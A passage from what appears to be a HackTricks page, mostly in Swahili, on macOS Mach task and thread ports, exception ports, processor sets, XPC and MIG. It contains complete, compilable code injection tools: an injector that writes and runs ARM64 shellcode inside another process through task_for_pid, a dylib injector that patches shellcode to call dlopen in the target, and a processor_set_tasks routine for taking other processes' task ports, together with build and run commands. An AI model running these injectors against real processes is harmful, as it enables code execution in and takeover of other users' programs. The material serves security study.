* **TASK\_WIRED\_LEDGER\_PORT**\[ledger send right]: Bandari inayotaja chanzo ambacho kazi hii inapata kumbukumbu yake ya kernel iliyounganishwa.
* **TASK\_PAGED\_LEDGER\_PORT**\[ledger send right]: Bandari inayotaja chanzo ambacho kazi hii inapata kumbukumbu yake ya kawaida inayosimamiwa.

### Task Ports

Awali Mach haikuwa na "mchakato" ilikuwa na "kazi" ambayo ilichukuliwa kama chombo cha nyuzi. Wakati Mach ilipounganishwa na BSD **kila kazi ilihusishwa na mchakato wa BSD**. Hivyo kila mchakato wa BSD una maelezo inayoihitaji kuwa mchakato na kila kazi ya Mach pia ina kazi zake za ndani (isipokuwa kwa pid 0 isiyokuwepo ambayo ni `kernel_task`).

Kuna kazi mbili za kuvutia zinazohusiana na hii:

* `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Pata haki ya SEND kwa bandari ya kazi ya kazi inayohusiana na ile iliyoainishwa na `pid` na uipe `target_task_port` iliyoonyeshwa (ambayo mara nyingi ni kazi ya mwito ambayo imetumia `mach_task_self()`, lakini inaweza kuwa bandari ya SEND juu ya kazi tofauti).
* `pid_for_task(task, &pid)`: Iwapo kuna haki ya SEND kwa kazi, pata ni PID ipi kazi hii inahusiana nayo.

Ili kutekeleza vitendo ndani ya kazi, kazi ilihitaji haki ya `SEND` kwa yenyewe ikitumia `mach_task_self()` (ambayo inatumia `task_self_trap` (28)). Kwa ruhusa hii kazi inaweza kutekeleza vitendo kadhaa kama:

* `task_threads`: Pata haki ya SEND juu ya bandari zote za kazi za nyuzi za kazi
* `task_info`: Pata taarifa kuhusu kazi
* `task_suspend/resume`: Acha au anza tena kazi
* `task_[get/set]_special_port`
* `thread_create`: Unda nyuzi
* `task_[get/set]_state`: Dhibiti hali ya kazi
* na zaidi yanaweza kupatikana katika [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

{% hint style="danger" %}
Kumbuka kwamba kwa haki ya SEND juu ya bandari ya kazi ya **kazi tofauti**, inawezekana kutekeleza vitendo kama hivyo juu ya kazi tofauti.
{% endhint %}

Zaidi ya hayo, bandari ya task\_port pia ni bandari ya **`vm_map`** ambayo inaruhusu **kusoma na kudhibiti kumbukumbu** ndani ya kazi kwa kazi kama `vm_read()` na `vm_write()`. Hii inamaanisha kwamba kazi yenye haki za SEND juu ya bandari ya task\_port ya kazi tofauti itakuwa na uwezo wa **kuingiza msimbo ndani ya kazi hiyo**.

Kumbuka kwamba kwa sababu **kernel pia ni kazi**, ikiwa mtu atafanikiwa kupata **ruhusa za SEND** juu ya **`kernel_task`**, itakuwa na uwezo wa kufanya kernel itekeleze chochote (jailbreaks).

* Piga `mach_task_self()` ili **kupata jina** la bandari hii kwa kazi ya mwito. Bandari hii inarithiwa tu kupitia **`exec()`**; kazi mpya iliyoundwa na `fork()` inapata bandari mpya ya kazi (kama kesi maalum, kazi pia inapata bandari mpya ya kazi baada ya `exec()` katika binary ya suid). Njia pekee ya kuanzisha kazi na kupata bandari yake ni kufanya ["port swap dance"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) wakati wa kufanya `fork()`.
* Hizi ndizo vizuizi vya kufikia bandari (kutoka `macos_task_policy` kutoka binary `AppleMobileFileIntegrity`):
* Ikiwa programu ina **`com.apple.security.get-task-allow` entitlement** mchakato kutoka **mtumiaji yule yule wanaweza kufikia bandari ya kazi** (kawaida huongezwa na Xcode kwa ajili ya ufuatiliaji). Mchakato wa **notarization** hautaruhusu kwa toleo la uzalishaji.
* Programu zenye **`com.apple.system-task-ports`** entitlement zinaweza kupata **bandari ya kazi kwa mchakato wowote**, isipokuwa kernel. Katika toleo za zamani ilijulikana kama **`task_for_pid-allow`**. Hii inatolewa tu kwa programu za Apple.
* **Root anaweza kufikia bandari za kazi** za programu **zisizokuwepo** na **runtime iliyoimarishwa** (na sio kutoka Apple).

**Bandari ya jina la kazi:** Toleo lisilo na haki za _bandari ya kazi_. Inarejelea kazi, lakini haiwezeshi kudhibiti. Kitu pekee kinachonekana kupatikana kupitia hiyo ni `task_info()`.

### Thread Ports

Nyuzi pia zina bandari zinazohusiana, ambazo zinaonekana kutoka kwa kazi inayopiga **`task_threads`** na kutoka kwa processor na `processor_set_threads`. Haki ya SEND kwa bandari ya nyuzi inaruhusu kutumia kazi kutoka mfumo wa `thread_act`, kama:

* `thread_terminate`
* `thread_[get/set]_state`
* `act_[get/set]_state`
* `thread_[suspend/resume]`
* `thread_info`
* ...

Nyuzi yoyote inaweza kupata bandari hii kwa kupiga **`mach_thread_sef`**.

### Shellcode Injection in thread via Task port

Unaweza kupata shellcode kutoka:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Kusanya** programu ya awali na kuongeza **entitlements** ili uweze kuingiza msimbo na mtumiaji yule yule (ikiwa sivyo utahitaji kutumia **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
{% hint style="success" %}
Ili hii ifanye kazi kwenye iOS unahitaji ruhusa `dynamic-codesigning` ili uweze kutengeneza executable yenye kumbukumbu inayoweza kuandikwa.
{% endhint %}

### Dylib Injection katika thread kupitia Task port

Katika macOS **threads** zinaweza kudhibitiwa kupitia **Mach** au kutumia **posix `pthread` api**. Thread tuliyoitengeneza katika sindano ya awali, ilitengenezwa kwa kutumia Mach api, hivyo **siyo ya posix**.

Ilikuwa inawezekana **kuiingiza shellcode rahisi** ili kutekeleza amri kwa sababu **haikuhitaji kufanya kazi na apis za posix**, tu na Mach. **Kuingiza kwa hali ngumu zaidi** kutahitaji **thread** pia iwe **ya posix**.

Hivyo, ili **kuboresha thread** inapaswa kuita **`pthread_create_from_mach_thread`** ambayo itaunda **pthread halali**. Kisha, hii pthread mpya inaweza **kuita dlopen** ili **kupakia dylib** kutoka mfumo, hivyo badala ya kuandika shellcode mpya ili kutekeleza vitendo tofauti inawezekana kupakia maktaba maalum.

Unaweza kupata **esemble dylibs** katika (kwa mfano ile inayozalisha log na kisha unaweza kuisikiliza):

{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Katika mbinu hii, nyuzi ya mchakato inatekwa:

{% content-ref url="macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

### Task Port Injection Detection

Wakati wa kuita `task_for_pid` au `thread_create_*` huongeza hesabu katika muundo wa kazi kutoka kwa kernel ambayo inaweza kufikiwa kutoka kwa hali ya mtumiaji kwa kuita task\_info(task, TASK\_EXTMOD\_INFO, ...)

## Exception Ports

Wakati hitilafu inapotokea katika nyuzi, hitilafu hii inatumwa kwa bandari ya hitilafu iliyoteuliwa ya nyuzi. Ikiwa nyuzi haishughuliki, basi inatumwa kwa bandari za hitilafu za kazi. Ikiwa kazi haishughuliki, basi inatumwa kwa bandari ya mwenyeji ambayo inasimamiwa na launchd (ambapo itakubaliwa). Hii inaitwa triage ya hitilafu.

Kumbuka kwamba mwishoni mara nyingi ikiwa haishughuliki vizuri ripoti itamalizika kushughulikiwa na daemon ya ReportCrash. Hata hivyo, inawezekana kwa nyuzi nyingine katika kazi hiyo hiyo kushughulikia hitilafu, hii ndiyo inayo fanywa na zana za ripoti za ajali kama `PLCreashReporter`.

## Other Objects

### Clock

Mtumiaji yeyote anaweza kufikia habari kuhusu saa hata hivyo ili kuweka muda au kubadilisha mipangilio mingine inahitajika kuwa root.

Ili kupata habari inawezekana kuita kazi kutoka kwa mfumo wa `clock` kama: `clock_get_time`, `clock_get_attributtes` au `clock_alarm`\
Ili kubadilisha thamani mfumo wa `clock_priv` unaweza kutumika na kazi kama `clock_set_time` na `clock_set_attributes`

### Processors and Processor Set

APIs za processor zinaruhusu kudhibiti processor moja ya mantiki kwa kuita kazi kama `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

Zaidi ya hayo, APIs za **processor set** zinatoa njia ya kuunganisha processors nyingi katika kundi. Inawezekana kupata seti ya processor ya kawaida kwa kuita **`processor_set_default`**.\
Hizi ni baadhi ya APIs za kuvutia kuingiliana na seti ya processor:

* `processor_set_statistics`
* `processor_set_tasks`: Rudisha array ya haki za kutuma kwa kazi zote ndani ya seti ya processor
* `processor_set_threads`: Rudisha array ya haki za kutuma kwa nyuzi zote ndani ya seti ya processor
* `processor_set_stack_usage`
* `processor_set_info`

Kama ilivyotajwa katika [**hiki chapisho**](https://reverse.put.as/2014/05/05/about-the-processor\_set\_tasks-access-to-kernel-memory-vulnerability/), zamani hii iliruhusu kupita ulinzi ulioelezwa hapo awali ili kupata bandari za kazi katika michakato mingine ili kuziendesha kwa kuita **`processor_set_tasks`** na kupata bandari ya mwenyeji kwenye kila mchakato.\
Sasa unahitaji root kutumia kazi hiyo na hii inprotected hivyo utaweza kupata hizi bandari tu kwenye michakato isiyo na ulinzi.

Unaweza kujaribu na:

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:

{% content-ref url="macos-xpc/" %}
[macos-xpc](macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:

{% content-ref url="macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## References

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
* [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
